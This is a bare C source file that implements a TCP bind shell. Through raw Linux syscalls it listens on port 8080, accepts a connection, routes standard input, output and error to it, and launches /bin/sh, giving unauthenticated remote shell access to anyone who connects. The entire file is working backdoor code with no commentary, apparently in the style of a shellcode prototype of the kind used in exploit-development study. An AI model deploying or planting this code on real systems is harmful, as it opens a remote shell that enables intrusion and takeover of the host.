#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <arpa/inet.h>

void main(void)
{
	int resultfd, sockfd, one = 1;

	struct sockaddr_in my_addr;

	sockfd = syscall(41, AF_INET, SOCK_STREAM, 6);

    syscall(54, sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	my_addr.sin_family = AF_INET; 
	my_addr.sin_port = htons(8080); 
	my_addr.sin_addr.s_addr = htonl(INADDR_ANY); 

	syscall(49, sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	syscall(50, sockfd, 0);

	resultfd = accept(sockfd, NULL, NULL);

	syscall(33, resultfd, 0);
	syscall(33, resultfd, 1);
	syscall(33, resultfd, 2);

	syscall(59, "/bin/sh", NULL, NULL);
}
